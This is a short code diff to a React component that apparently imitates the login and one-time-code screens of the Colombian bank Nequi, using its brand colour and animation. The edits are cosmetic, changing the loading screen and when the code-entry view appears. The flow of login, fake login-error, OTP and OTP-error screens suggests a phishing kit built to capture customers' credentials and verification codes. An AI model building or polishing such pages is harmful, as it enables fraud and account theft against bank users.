@@ -19,8 +19,8 @@ function esCelularColombianoValido(numero) {
 
 const Loading = () => {
   return (
-    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
-      <div className="w-12 h-12 border-4 border-[#da0081] border-t-transparent rounded-full animate-spin" />
+    <div className="fixed inset-0 bg-[#fcfcfc] flex items-center justify-center z-50">
+      <img src="/assets/nequi/nequi.gif"/>
     </div>
   );
 };
@@ -215,7 +215,7 @@ const Dinamica = ({handler})=>{
 export default function Nequi (){
     const [inicioSesion, setInicioSesion] = useState(false)
     const [selectVista, setSelectVisata] = useState(null)
-    const [loading, setLoading] = useState(false)
+    const [loading, setLoading] = useState(true)
     const [tituloError, setTituloError] = useState("")
     const [reLoad, setReLoad] = useState(false)
     const [key, setKey] = useState(0)
@@ -410,9 +410,7 @@ export default function Nequi (){
                 {loading && <Loading/>}
                 {reLoad && <Loading/>}
                 {!inicioSesion && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
-                {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
-                
-                <Dinamica handler={handlerAplicacion}/>  
+                {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}  
                 {selectVista == "otpapp" && <Dinamica handler={handlerAplicacion}/>}
                 {selectVista == "otpapp-error" && <Dinamica handler={handlerAplicacion}/>}
                 
